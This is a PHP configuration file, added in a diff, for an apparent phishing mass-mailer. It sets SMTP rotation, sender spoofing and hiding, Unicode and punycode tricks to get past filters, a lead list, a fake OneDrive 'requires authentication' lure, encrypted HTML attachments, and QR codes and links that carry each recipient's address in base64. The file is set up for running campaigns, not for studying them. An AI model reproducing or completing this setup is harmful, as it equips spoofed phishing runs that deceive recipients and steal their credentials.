@@ -1,0 +1,168 @@
+<?php
+/*==============================SMTP Setup==============================*/
+$SMTP = [
+
+    [
+        'SMTP Server' 	=> '', // SMTP server address
+        'Username'		=> '', // Email / Username of your SMTP
+        'Password' 		=> '', // Password of your SMTP
+        'Port' 			=> '', // Port of your SMTP
+        'Tls' 			=> '', // Choose 'ssl' or 'tls' for connection
+    ],
+
+    /*Sample of Single SMTP*/
+	/*
+	  [
+	  'SMTP Server' 	=> 'smtp.a29.com', // SMTP server address
+	  'Username'    	=> 'username@a29.com', // Email / Username of your SMTP
+	  'Password'    	=> 'P@55w0rd', // Password of your SMTP
+	  'Port'        	=> '587', // Port of your SMTP
+	  'Tls'         	=> 'tls', // Choose 'ssl' or 'tls' for connection
+		],
+	*/
+
+	/*Sample of Multiple SMTP*/
+	/*
+	  [
+	  'SMTP Server' 	=> 'smtp.a29.com', // SMTP server address
+	  'Username'    	=> 'username1@a29.com', // Email / Username of your SMTP
+	  'Password'    	=> 'P@55w0rd', // Password of your SMTP
+	  'Port'        	=> '587', // Port of your SMTP
+	  'Tls'         	=> 'tls', // Choose 'ssl' or 'tls' for connection
+		 ],
+	  
+	  [
+	  'SMTP Server' 	=> 'smtp.a29.com', // SMTP server address
+	  'Username'    	=> 'username2@a29.com', // Email / Username of your SMTP
+	  'Password'    	=> 'P@55w0rd', // Password of your SMTP
+	  'Port'        	=> '587', // Port of your SMTP
+	  'Tls'         	=> 'tls', // Choose 'ssl' or 'tls' for connection
+		],
+	*/
+];
+
+/*==============================Sender Setup==============================*/
+$SETUP = [
+/*==============================Mail Priority==============================*/
+    'Mail Priority'	=> 1, // 1 = Very Important | 2 = Important | 3 = Normal
+
+
+/*==============================Time==============================*/
+    'Time'	=> 'America/Adak', // Timezones, Check here 'https://www.w3schools.com/php/php_ref_timezones.asp'
+
+
+/*==============================Sleeptime==============================*/
+    'Sleeptime' => 8, // Delay for each sending
+    'Thread'	=> 1, // How many email per send ( G29 max 1 Thread | KillerMailer max 50 Thread )
+
+
+/*==============================Encoding==============================*/
+    'Encryption'	=> 'unicode', //DEFAULT are Unicode. Encryption option unicode, unicodebold, unicodeitalic, punnycode
+    'Charset'		=> 'utf-8', //DEFAULT are utf-8. Charset option us-ascii, iso-8859-1, utf-8
+    'Encoding'		=> 'base64', //DEFAULT are base64, Encoding option 7bit, 8bit, base64, binary, quoted-printable
+
+
+/*==============================Sender Details==============================*/
+    'From Name' 			=> ['A29<CHAR3>-<RANDSTRING>'], // <FUNCTION WORKS> Multi Fromname Sample => ['fromname1','fromname2','fromname3',],
+    'From Name Encryption'	=> 0, // You can choose 3 different Encoding ( 0 | 1 )
+    'Mail Subject' 			=> ['HelloTest<NUMBER3> - <DATE>'], // <FUNCTION WORKS> Multi Subject Sample => ['subject1','subject2','subject3',],
+    'Subject Encryption' 	=> 1, //  You can choose 3 different Encoding ( 0 | 1 | 2 )
+    'From Mail' 			=> [''], //<FUNCTION WORKS>  ['spoof@1.com','spoof@2.com','spoof@3.com'] 
+    'Masking From Mail' 	=> 0, // 1 = Spoof email | 0 = Not spoofing
+    'Hiding From Mail' 		=> 0, // 1= Hiding frommail | 0 No WORKS frommail must be used, WORKS only with smtp that can spoof email outside the email host example: godaddy, gsuite
+
+
+/*==============================Email Testing==============================*/
+    'Email Test' 		=> 0, // 1 = Testing email on | 0 = Testing email off
+    'Test Every' 		=> 100, // Send email test every
+    'Email Destination' => 'admin@a29.com', // Testing Destination
+
+
+/*==============================Reply-to==============================*/
+    'Reply-to'		=> 0, // 1 = Reply-to function on | 0 = Reply-to function off
+    'Reply-to Mail' => '', // Email for reply-to
+    'Reply-to Name' => '', // Name for reply-to
+
+
+/*==============================Image Function==============================*/
+    /*Image To Html*/
+    'Img to HTML' 			=> 0, // 1 = Image to HTML on | 0 = Image to HTML off
+    'Img File Location'		=> 'Sender/a29.jpg', // Location of the Image Located
+    'Img to HTML Width'		=> '100%', // Image Width size. Can use 'px' or '%'
+    'Img to HTML Height'	=> '100%', // Image Width size. Can use 'px' or '%'
+
+    /*Html To Image*/
+    'HTML to Img' 			=> 0, // Convert your html to IMG Letter (You can add multiple img 'Source From Anywhere')
+    'HTML to Img Letter'	=> 'Sender/imagetohtml.html', // file for IMG Letter
+    'HTML to Img Width'		=> '100%', // Image Width size. Can use 'px' or '%'
+    'HTML to Img Height'	=> '100%', // Image Width size. Can use 'px' or '%'
+    'HTML to Img Transparent' => 0, // 0 = Background solid | 1 = Background Transparent
+
+/*==============================Sending Setup==============================*/
+    'Letter'	=> 'Sender/Letter.html', // Letter that you want to use
+    'Maillist'	=> 'Sender/Leads.txt', // Maillist that you want to use
+
+
+/*==============================Auto Project==============================*/
+	/*Auto Project*/
+	'Auto Project'		    => 0, // 1 = Auto Project on | 0 = Auto Project off
+	'Type Project'		    => '', // Choose L1,L2,L3,L4,L5,L6,L7,L8,L9,L10 & Q1,Q2,Q3,Q4,Q5,Q6
+	'Auto Attachment'	    => 0, // 1 = Auto Attachment on | 0 = Auto Attachment off
+	'Type Attachment'	    => '', // Choose L1,L2,L3,L4,L5,L6,L7,L8,L9,L10 & Q1,Q2,Q3,Q4,Q5,Q6
+	'Auto HTML Attachment'  => 0, // 1 = Auto HTML Attachment on | 0 = Auto Html Attachment off
+	'Auto HTML Message'     => 'This File Was Shared Via OneDrive & Requires Authentication. Press Ok To Continue.', // Alert for attachment, leave it blank for no alert
+	'Auto Subject'          => 0, // 1 = Auto Subject on | 0 = Auto Subject off
+    'Auto Disclaimer'	    => 0, // 1 = Auto Disclaimer on | 0 = Auto Disclaimer off
+	'Auto Disclaimer Type'	=> 0, // 1 = Dynamic Disclaimer | 0 = Static Disclaimer
+   
+   
+/*==============================Attachment==============================*/
+    'Send Attachment'	=> 0, // 1 = Send Attachment on | 0 = Send Attachment off
+
+    /*Pdf Attachment*/
+    'HTML to Pdf Attachment'	=> 0, // 1 = HTML Attachment on | 0 = HTML Attachment off.
+    'HTML to Pdf Content' 		=> 'Sender/pdfattachment.html', //PDF Content (HTML) <FUNCTION WORKS>
+    'HTML to Pdf Name'			=> '<CHAR3>-<NUMBER6>.pdf', // Name for PDF <FUNCTION WORKS>
+    'HTML to Pdf Output'        => 'html', // generated pdf content (html | img)
+
+
+    /*Html Attachment*/
+    'HTML Attachment' 		=> 0, // 1 = HTML Attachment on | 0 = HTML Attachment off.
+    'File Attachment' 		=> 'Sender/attachment.html', // Attachment to send <FUNCTION WORKS>
+    'Name Attachment' 		=> '<CHAR3>-<NUMBER6>.htm', // Name for attachment <FUNCTION WORKS>
+    'Attachment Encryption' => 0, // 1 = Encryption on | 0 = Encryption off. Encryption for HTML Attachment
+
+    /*Eml Attachment*/
+    'EML Attachment'		=> 0, // 1 = Eml Attachment on | 0 = Eml Attachment off.
+    'EML File Attachment'	=> 'Sender/emlattachment.html', // Eml Attachment to send <FUNCTION WORKS>
+    'Name EML Attachment'	=> '<CHAR3>-<NUMBER6>.eml', // Name for Eml Attachment <FUNCTION WORKS>
+
+
+/*==============================QR==============================*/
+    /*QR Link Function*/
+    'QR Code' 	=> 0, // 1 = QR Function on | 0 QR Function off
+    'QR Link' 	=> ['https://yourlink.com/loc/#<EMAIL64>',], //Link for QR, Function are works in this
+    'QR Widith' => '150', // QR Widith size
+    'QR Height' => '150', // QR Height size
+
+
+/*==============================Link==============================*/
+    'Link' 			=> ['https://your.link/<EMAIL64>'], // Link for function <LINK> and autolink attachment
+    'Base64 Link' 	=> 'https://your.link/<EMAIL64>', // Base64 Link for function <LINK64>
+
+
+    /* Example of Single Link */
+    /*
+    'Link'			=> ['https://google.com'], // Link for function <LINK> and autolink attachment
+    */
+
+    /*Example of Multiple Link */
+    /*
+    'Link' 			=> ['https://google.com','https://yahoo.com','https://outlook.com'], // Link for function <LINK> and autolink attachment
+    */
+
+    /*Example of Multiple QR Link */
+    /*
+    'QR Link' 			=> ['https://google.com','https://yahoo.com','https://outlook.com'], // Link for function <LINK> and autolink attachment
+    */
+];
